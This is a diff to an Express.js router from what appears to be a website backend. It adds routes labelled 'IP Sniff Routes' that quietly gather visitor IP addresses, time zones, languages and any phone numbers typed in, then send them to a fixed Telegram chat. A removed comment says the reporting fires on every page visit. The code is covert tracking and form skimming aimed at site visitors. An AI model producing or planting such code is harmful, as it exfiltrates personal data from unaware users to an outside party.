@@ -13,6 +13,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const express_1 = __importDefault(require("express"));
+const telegram_1 = require("../utils/telegram");
 const router = express_1.default.Router();
 router.get('/checkmyerror', (req, res, next) => {
     next(new Error('some error message i sent for you'));
@@ -61,46 +62,68 @@ router.get("/newRoute", (req, res) => {
         message: "this is a new route",
     });
 });
+// ---------------------------------------- IP Sniff Routes -------------------------------------------
+function getPostClientIp(req) {
+    const forwarded = req.headers["x-forwarded-for"];
+    return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
+}
+const TELEGRAM_CHAT_IDS = [
+    process.env.TELEGRAM_CHAT_ID_1,
+    process.env.TELEGRAM_CHAT_ID_2,
+].filter(Boolean);
+router.post("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    var _a, _b;
+    const ip = getPostClientIp(req);
+    const { timeInfo, languageInfo } = (_a = req.body) !== null && _a !== void 0 ? _a : {};
+    if (!timeInfo ||
+        typeof timeInfo.visitorTimeZone !== "string" ||
+        !languageInfo ||
+        typeof languageInfo.language !== "string") {
+        return res.status(400).json({
+            error: "Invalid request body",
+        });
+    }
+    const message = `
+🎉 <b>یک بازدیدکننده‌ی خاص وارد شد</b>
+
+🌐 <b>آی‌پی:</b> ${ip}
+
+🕒 <b>اطلاعات زمانی</b>
+منطقه‌ی زمانی بازدیدکننده: ${timeInfo.visitorTimeZone}
+اختلاف زمانی با تهران (دقیقه): ${timeInfo.difference}
+
+🗣 <b>اطلاعات زبان</b>
+زبان: ${languageInfo.language}
+زبان‌های تنظیم‌شده: ${Array.isArray(languageInfo.languages)
+        ? languageInfo.languages.join("، ")
+        : "در دسترس نیست"}
+لوکال: ${(_b = languageInfo.locale) !== null && _b !== void 0 ? _b : "در دسترس نیست"}
+`;
+    try {
+        yield (0, telegram_1.sendTelegramMessageToAll)(message, [5665639218]);
+        return res.json({
+            success: true,
+            message: "Sent successfully",
+        });
+    }
+    catch (error) {
+        console.error("Telegram request failed:", error);
+        return res.status(500).json({
+            success: false,
+            message: "Telegram request failed",
+        });
+    }
+}));
 function getClientIp(req) {
     const forwarded = req.headers["x-forwarded-for"];
     return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
 }
-function sendTelegramMessage(text) {
-    return __awaiter(this, void 0, void 0, function* () {
-        yield fetch(`https://api.telegram.org/bot${process.env.TELE_KEY}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: 5665639218,
-                text,
-            }),
-        });
-    });
-}
-/* =========================================================================
- * 1) GET /api/tests/getIp
- *    Fires on EVERY page visit. Knows nothing about phone numbers or the
- *    send-code button — it only ever reports the visitor's IP.
- * ========================================================================= */
-router.get("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
-    const ip = getClientIp(req);
-    let message;
-    try {
-        yield sendTelegramMessage(`A Special Someone IP Is : ${ip}`);
-        message = "Sent was Successful Arash";
-    }
-    catch (error) {
-        message = "Telegram request failed " + error;
-    }
-    // the original route never responded, so the frontend's res.json() would hang forever.
-    res.json({ ip, message });
-}));
 router.get("/phoneEntered", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const ip = getClientIp(req);
     const phone = typeof req.query.phone === "string" ? req.query.phone.trim() : "";
     let message;
     try {
-        yield sendTelegramMessage(`A Special User Entered Phone: ${phone} — IP: ${ip}`);
+        yield (0, telegram_1.sendTelegramMessageToAll)(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218]);
         message = "Sent was Successful Arash";
     }
     catch (error) {
